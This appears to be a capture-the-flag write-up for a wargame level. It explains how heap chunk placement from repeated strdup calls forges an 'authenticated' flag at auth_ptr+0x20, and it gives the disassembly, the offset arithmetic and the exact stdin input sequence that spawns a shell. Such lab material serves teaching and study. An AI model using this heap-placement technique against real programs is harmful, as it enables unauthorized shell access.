# Way to level9

## Core
`main` is an endless **command dispatcher**: each loop `fgets`es a line (`0x80` B into a stack
buffer) and prefix-matches it with `repz cmpsb` against `auth `/`reset`/`service`/`login`.
There is **no overflow** here — the trick is pure **heap feng-shui**. The win check after
`login` is `*(auth_ptr + 0x20) != 0` → `system("/bin/sh")`. `auth ` only does `malloc(4)`, so
nothing it writes can reach offset `0x20`. But `service` does `strdup`, and glibc hands out
chunks `0x10` apart; the **2nd** `strdup` lands exactly on `auth_ptr+0x20`, and if that string
is non-empty its first byte is non-zero → the "authenticated" flag is forged.

## Decisive disass (full: `disas main`, `info functions`, `x/s` the strings)
```
main (loop; repz cmpsb = memcmp prefix match):
<+45>:  call printf@plt     ; prints "%p, %p" of globals auth(0x8049aac) & service(0x8049ab0)
<+74>:  call fgets@plt      ; fgets(buf=esp+0x20, 0x80, stdin)
"auth "   : <+135> call malloc@plt  ; malloc(4) -> global 0x8049aac (auth_ptr); zeroes [0,4)
"reset"   : <+271> call free@plt    ; free(auth_ptr)
"service" : <+327> call strdup@plt  ; strdup(input+7) -> global 0x8049ab0
"login"   -> win check:
<+382>: mov 0x8049aac,%eax   ; eax = auth_ptr
<+387>: mov 0x20(%eax),%eax  ; eax = *(auth_ptr+0x20)  — the session "authenticated" flag
<+392>: je  <+411>           ; zero -> only print "Password:"
<+401>: call system@plt      ; system("/bin/sh")   (arg 0x8048833)
```
Strings: `x/s 0x8048819`=`"auth "` (trailing space → 5-byte prefix), `0x804881f`=`"reset"`,
`0x8048825`=`"service"`, `0x804882d`=`"login"`, `0x8048833`=`"/bin/sh"`.
Globals: `0x8049aac` auth_ptr (read by win check), `0x8049ab0` service ptr.

## Exploit
- Win condition: `*(auth_ptr+0x20) != 0`. `auth ` = `malloc(4)` only, so offset `0x20` is
  outside its chunk — `auth` can never set the flag itself.
- offset derivation (gdb, read from the `%p, %p` feedback): `auth` chunk = `0x804a008`,
  1st `strdup` = `0x804a018`, 2nd = `0x804a028` — each `0x10` apart (glibc min chunk:
  header+alignment). `0x20 / 0x10 = 2`, so the **2nd** `strdup` lands at
  `auth_ptr+0x20 = 0x804a008+0x20 = 0x804a028`. A non-empty string there → first byte
  non-zero → flag forged (e.g. `*(auth_ptr+0x20) = "1234" = 0x34333231`).
- Sequence: `auth ` (allocate auth_ptr) → `service` empty (burns the `0x804a018` chunk) →
  `service<stuff>` (lands on `0x804a028`, carries content) → `login` (flag ≠ 0 → shell).
- Delivery: **stdin**, interactive; no argv, no overflow, no injected code.
```bash
./level8
auth 
service
service123456789abcdef
login
$ whoami
level9
```

## Diff from previous
level7 was a heap **overflow → GOT overwrite** driven by `argv`. level8 has **no corruption
primitive at all**: it abuses heap **allocator placement** — spray `strdup` chunks until one
coincides with `auth_ptr+0x20`, forging the "authenticated" dword, then `login` runs
`system("/bin/sh")` for us. First level won purely by **allocation positioning** over a
stdin command loop, rather than by overwriting a pointer/return address/vtable.
